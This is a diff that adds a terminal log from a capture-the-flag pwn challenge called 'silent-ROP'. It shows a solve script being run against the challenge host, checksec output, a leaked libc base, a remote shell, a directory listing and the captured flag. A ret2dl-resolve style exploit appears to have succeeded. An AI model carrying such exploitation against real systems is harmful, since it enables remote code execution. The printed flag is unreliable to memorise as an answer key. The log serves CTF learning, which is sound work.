@@ -1,0 +1,32 @@
+mito@ubuntu:~/CTF/K3RN3LCTF/Pwn_silent-ROP$ python3 solve.py r
+[*] '/home/mito/CTF/K3RN3LCTF/Pwn_silent-ROP/silent-ROP'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Opening connection to ctf.k3rn3l4rmy.com on port 2202: Done
+[*] '/home/mito/CTF/K3RN3LCTF/Pwn_silent-ROP/libc.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+solve.py:29: BytesWarning: Text is not bytes; assuming ISO-8859-1, no guarantees. See https://docs.pwntools.com/#bytes
+  s.send("\xd0\x7c")
+libc_base = 0xf7ce6000
+[*] Switching to interactive mode
+\xc7\xed\xf7\xc7\x15\xf7\xc7\xed\xf7\xc7\xed\xf7\xc7\xed\xf7\xc7\xed\xf7\xc8\xed\xf7
+\x87(\xad\xfbg\xed\xf7g\x1d\xf7g\xed\xf7g\xed\xf7g\xed\xf7g\xed\xf7g\xed\xf7h\xed\xf7
+$                              id
+uid=1000 gid=1000 groups=1000
+$ ls -l
+total 2180
+-rw-rw-r-- 1 nobody nogroup      44 Nov 11 02:58 flag.txt
+-rwxrwxr-x 1 nobody nogroup  180628 Nov 11 02:58 ld-2.31.so
+-rwxrwxr-x 1 nobody nogroup 2022760 Nov 11 02:58 libc.so.6
+-rwxrwxr-x 1 nobody nogroup   19728 Nov 11 23:03 run
+$ 
+$ cat flag.txt
+flag{r3t_2_dl_r3s0lve_d03s_n0t_n3ed_a_l34k}
+$ 
